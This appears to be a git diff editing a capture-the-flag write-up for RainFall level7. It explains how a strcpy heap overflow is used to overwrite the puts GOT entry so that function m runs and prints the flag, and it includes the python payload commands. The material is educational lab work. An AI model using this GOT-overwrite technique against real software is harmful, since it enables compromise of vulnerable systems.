@@ -42,7 +42,7 @@ Segmentation fault (core dumped)
 level7@RainFall:~$
 ```
 
-It gives segmentation fault, and we want to avoid having it, so let's take a look at the binary.
+It gives segmentation fault, and we want to avoid that, so let's take a look at the binary.
 
 ```
 level7@RainFall:~$ gdb ./level7
@@ -120,7 +120,7 @@ gdb-peda$
 
 By analyzing the main function, the main function takes arguments(`argv`) from `stdin`, takes and allocates into two local variables. Afterwards, the function `fgets` with arguments will be called and stores the value into the global variable `c(0x08049960)`, and the string `~~` will be printed out.
 
-But the goal is to get the flag, and the program doesn't seem to print out flags in any point without exploiting them.
+But the goal is to get the flag, and the program doesn't seem to print out flags without an exploit.
 
 ```
 level7@RainFall:~$ ./level7 aaaa bbbb
@@ -128,7 +128,7 @@ level7@RainFall:~$ ./level7 aaaa bbbb
 level7@RainFall:~$
 ```
 
-let's see if there is any other function declared.
+Let's see if there is any other function declared.
 
 ```
 gdb-peda$ info functions
@@ -139,7 +139,7 @@ All defined functions:
 [...]
 ```
 
-the funciton `m` is here, so let's see the assembly
+The funciton `m` is here, so let's see the assembly.
 
 ```
 gdb-peda$ disass m
@@ -161,11 +161,11 @@ End of assembler dump.
 
 By decompiling the assembly, the function calls out `time`, and prints out the value from given parameters.
 
-During the first call to strcpy(), we can overwrite the address used as destination for the second strcpy() (b[1]) => we want to overwrite function puts() GOT address to call function m() instead.
+During the first call to `strcpy`, we can overwrite the address used as destination for the second `strcpy` (`second[1]`) => we want to overwrite function puts() GOT address to call function `m` instead.
 
 In order to do, it is necessary to find out the offset.
 
-By using [Buffer Overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/), it is easy to find the offset.
+By using a [buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/), it is easy to find the offset.
 
 By using the 'pattern generator', the offset is 20
 
@@ -182,14 +182,12 @@ strcpy(0x37614136, NULL <unfinished ...>
 +++ killed by SIGSEGV +++
 ```
 
-During the first call to strcpy(), we can overwrite the address used as destination for the second strcpy() (b[1]) => we want to overwrite function puts() GOT address to call function m() instead. We need to find the puts() GOT entry (the pointer to overwrite) :
+After having figured out how to overwrite the `second[1]` pointer in the first part of this exploit, we then need to overwrite the `puts` GOT (Global Offset Table) address with a pointer to `m`. (See level 5 walkthrough for an explanation of GOT)
 
-[What is GOT?](https://www.linkedin.com/pulse/elf-linux-executable-plt-got-tables-mohammad-alhyari#:~:text=PLT%20and%20GOT%20are%20part,is%20used%20for%20linux%20executable.&text=Programming%20starts%20with%20having%20a,source%20code%20in%20a%20file.)
-- Global Offset Table is a writable memory that is used to store pointers to the functions resolved. Once the dynamic linker resolves a function then it will update GOT to have that entry read for usage.
+In short, instead of calling `puts`, we want to call `m`. The address for `puts` is cached on the GOT and we fill that cache before the real address gets checked.
 
-In short, instead of calling `puts`, we want to call `m`. The address for `puts` is stored on GOP, and we replace them.
+The address for `puts` can be easily found on gdb, anc can be checked by using `ltrace`.
 
-the address for `puts` can be easily found on gdb, anc can be checked by using ltrace
 ```
 All functions matching regular expression "puts":
 
@@ -198,11 +196,13 @@ Non-debugging symbols:
 0x08048400  puts@plt
 gdb-peda$ disass puts
 Dump of assembler code for function puts@plt:
-   0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
+   0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928    // same as 0x08049928
    0x08048406 <+6>:	push   0x28
    0x0804840b <+11>:	jmp    0x80483a0
 End of assembler dump.
 ```
+
+Here's our program with half of the exploit complete, writing `"AAAA"` into the pointer for `puts`.
 
 ```
 level7@RainFall:~$ ltrace ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') AAAA
@@ -219,14 +219,15 @@ fgets( <unfinished ...>
 +++ killed by SIGSEGV +++
 ```
 
-as found out above, the address for function `m()` is `0x080484f4`, so the payload needs to be set up as below:
+As found out above, the address for function `m()` is `0x080484f4`, so the payload needs to be set up as below:
 
 ```
     padding (20 bytes) + GOT address (4 bytes)   +   m() function address (4 bytes)
                      1st arg                                   2nd arg
 ```
 
-the output is just set as `%s - %c`
+And voilà our completed exploit:
+
 ```
 level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 - 1654670080
